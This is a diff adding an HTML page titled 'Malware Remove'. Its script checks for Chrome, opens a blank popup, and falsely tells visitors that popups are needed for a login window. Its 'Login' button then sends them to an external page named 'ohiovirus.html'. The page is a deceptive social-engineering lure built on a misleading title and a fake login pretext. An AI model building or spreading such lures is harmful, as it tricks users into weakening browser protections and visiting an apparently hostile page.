@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malware Remove</title>
+  <style>
+    body {
+      background-color: black;
+      color: red;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: white;
+      color: black;
+      border: 2px solid red;
+      padding: 10px 20px;
+      font-size: 1.2rem;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: red;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // Check if the browser is Google Chrome
+    const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+
+    if (!isChrome) {
+      // If not Chrome, display a message
+      document.body.innerHTML = `
+        <h1>This app requires that you use Google Chrome.</h1>
+      `;
+    } else {
+      // If Chrome, open a blank popup
+      window.open('', '', 'width=400,height=300');
+
+      // Set the main page as the example page
+      document.body.innerHTML = `
+        <h1>This app requires that you enable popups, since they are needed to show the login window. After doing so, click the Login button below.</h1>
+        <button onclick="window.location.href='https://stoker0.github.io/sites/unreviewed/coolify/ohiovirus.html'">Login</button>
+      `;
+    }
+  </script>
+</body>
+</html>
